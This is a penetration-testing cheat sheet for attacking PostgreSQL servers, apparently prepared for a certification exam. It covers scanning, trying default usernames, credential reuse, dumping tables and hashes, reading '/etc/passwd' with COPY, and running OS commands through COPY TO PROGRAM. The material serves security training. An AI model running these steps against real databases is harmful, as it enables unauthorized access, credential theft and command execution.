
# PostgreSQL (TCP/5432)

PostgreSQL is a relational database server commonly used by web applications and internal services.

In CRT-style environments, PostgreSQL may lead to:
- Credential disclosure
- Database dumping
- File read access
- Command execution (if misconfigured)
- Lateral movement



# 1. Detection

## Nmap

```
nmap -p 5432 -sV <IP>
nmap -p 5432 --script pgsql-info <IP>
```

Look for:
- Version
- Authentication mode
- SSL enabled/disabled



# 2. Manual Connection

Default port:

```
5432
```

Connect:

```
psql -h <IP> -U <USER>
```

If password required:

```
psql -h <IP> -U <USER> -W
```

Try common usernames:

```
postgres
admin
root
```



# 3. Credential Reuse

Try:
- Web app database creds (from config files)
- SSH creds
- Other service creds

PostgreSQL frequently uses shared credentials across services.



# 4. Basic Enumeration (Inside psql)

List databases:

```
\l
```

Connect to database:

```
\c <dbname>
```

List tables:

```
\dt
```

Describe table:

```
\d <table>
```

Dump table:

```
SELECT * FROM <table>;
```



# 5. Enumerate Users & Roles

```
\du
```

Or:

```
SELECT rolname FROM pg_roles;
```

Check privileges:

```
SELECT * FROM information_schema.role_table_grants;
```



# 6. Interesting Tables

Common sensitive tables:

```
users
accounts
auth
admin
credentials
```

Search for columns:

```
SELECT column_name FROM information_schema.columns WHERE table_name='<table>';
```

Look for:
- password
- hash
- api_key
- token



# 7. Hash Extraction

If hashes found:

Save and crack offline.

Common formats:
- MD5
- SCRAM-SHA-256

PostgreSQL MD5 format often looks like:

```
md5<32_hex_chars>
```



# 8. File Read via COPY

If superuser or sufficient privilege:

```
COPY table_name FROM '/etc/passwd';
```

Or:

```
COPY (SELECT '') TO '/tmp/test.txt';
```

Check if writable/readable.



# 9. Command Execution (If Superuser)

PostgreSQL superusers can execute system commands via:

```
COPY (SELECT '') TO PROGRAM 'id';
```

Example:

```
COPY (SELECT '') TO PROGRAM 'bash -c "id"';
```

If successful → OS command execution.

Requires superuser role.



# 10. Check Superuser Status

```
SELECT rolsuper FROM pg_roles WHERE rolname=current_user;
```

If true → high impact.



# 11. Extensions Abuse

List extensions:

```
\dx
```

Some extensions allow file or command execution if misconfigured.



# 12. SSL Check

Check if SSL required:

```
SHOW ssl;
```

If disabled and exposed externally → sensitive data transmitted in plaintext.



# 13. Configuration File Disclosure

If file read possible:

Common locations:

```
/var/lib/postgresql/
/etc/postgresql/
/var/lib/pgsql/data/
```

Look for:

```
postgresql.conf
pg_hba.conf
```



# 14. Pivot Opportunity

If PostgreSQL running internally:

Check internal network:

```
SELECT inet_server_addr();
```

Combine with:
- Internal service enumeration
- Credential reuse



# 15. Panic Mode Quick Checklist

```
nmap -p 5432 -sV <IP>

psql -h <IP> -U postgres

\l
\c <dbname>
\dt
\du

SELECT * FROM users;

SELECT rolsuper FROM pg_roles WHERE rolname=current_user;

COPY (SELECT '') TO PROGRAM 'id';
```
